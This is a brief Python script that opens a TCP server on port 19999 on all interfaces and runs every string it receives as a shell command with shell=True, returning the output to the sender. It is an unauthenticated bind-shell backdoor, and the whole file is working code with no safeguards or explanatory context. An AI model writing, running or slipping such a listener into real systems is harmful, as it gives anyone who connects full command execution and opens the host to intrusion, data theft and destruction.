from socket import *
import subprocess

if __name__ == "__main__":
    #setting server
    s = socket(AF_INET,SOCK_STREAM)
    s.bind(('',19999))
    s.listen(5)
    print("listening: ")
    while True:
        clientSocket, address = s.accept()
        inp = clientSocket.recv(4096)
        output = subprocess.check_output(inp.decode(),shell=True)
        clientSocket.send(output)
        clientSocket.close()